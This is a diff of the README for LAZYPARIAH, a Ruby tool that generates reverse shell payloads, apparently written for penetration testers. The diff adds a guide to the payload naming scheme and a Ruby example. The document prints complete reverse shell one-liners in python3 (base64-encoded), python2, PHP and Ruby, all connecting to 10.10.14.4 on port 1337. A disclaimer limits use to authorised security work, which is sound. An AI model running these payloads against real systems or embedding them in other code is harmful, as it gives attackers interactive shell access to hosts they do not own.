@@ -2,9 +2,9 @@
 A tool for generating reverse shell payloads on the fly.
 
 ## Description
-LAZYPARIAH is a simple tool for generating a range of reverse shell payloads on the fly.
+LAZYPARIAH is a simple command-line tool for generating a range of reverse shell payloads on the fly. It was written in pure Ruby and has no dependencies outside of the standard library.
 
-This tool is intended to be used only in authorised circumstances by qualified penetration testers, security researchers and red team professionals. Before downloading, installing or using this tool, ensure that you understand the relevant laws in your jurisdiction. The author of this tool does not endorse the usage of this tool for illegal or unauthorised purposes.
+This tool is intended to be used only in authorised circumstances by qualified penetration testers, security researchers and red team professionals. Before downloading, installing or using this tool, please ensure that you understand the relevant laws in your jurisdiction. The author of this tool does not endorse the usage of this tool for illegal or unauthorised purposes.
 
 ## Demonstration
 ![Alt text](./lazypariah-0.2.0.svg)
@@ -62,7 +62,15 @@ Valid Options:
     -v, --version                    Display version information and exit.
 ```
 
-## Output Examples
+## Examples
+The payloads listed above are more-or-less systematically named. Payloads ending with `_b64` essentially pipe base64-encoded code through to `base64 -d` and then on through to the relevant interpreter (such as `python3`, `python2` or `ruby`).
+
+Payloads ending with `_c` are directly executed using the relevant interpreter (e.g. `python3 -c` or `ruby -e`).
+
+Some payloads will specify a file descriptor to be used, such as `php_fd_5_tags`, which is a PHP payload that uses file descriptor 5 and is enclosed within PHP tags (`<?php` and `?>`).
+
+Below are some examples of commands and their respective outputs.
+
 Output of command `lazypariah -u python3_b64 10.10.14.4 1337`:
 ```
 echo%20aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%20%7C%20base64%20-d%20%7C%20python3
@@ -74,6 +82,10 @@ python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 Output of command `lazypariah php_fd_3_tags 10.10.14.4 1337`:
 ```
 <?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>
+```
+Output of command `lazypariah ruby 10.10.14.4 1337`:
+```
+require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
 ```
 
 ## Author
